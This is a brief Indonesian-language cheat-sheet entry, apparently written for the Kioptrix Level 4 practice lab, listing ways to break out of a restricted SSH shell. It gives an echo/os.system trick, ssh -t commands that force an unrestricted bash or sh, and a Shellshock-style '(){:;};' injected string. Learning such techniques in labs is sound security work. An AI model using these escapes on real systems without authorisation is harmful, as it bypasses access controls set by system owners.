
Terkadang kita bisa login ke SSH namun command yang bisa gunakan sangat terbatas. Hal ini seperti pada **Kioptrix Level 4**.

### Jika terdapat perintah echo
```
echo os.system("/bin/bash")
```

### Via SSH
```
ssh user@10.0.0.3 -t "/bin/sh"
```

```
ssh user@10.0.0.3 -t "bash --noprofile"
```

```
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"
```

Kalau belum bisa, baca https://0xffsec.com/handbook/shells/restricted-shells/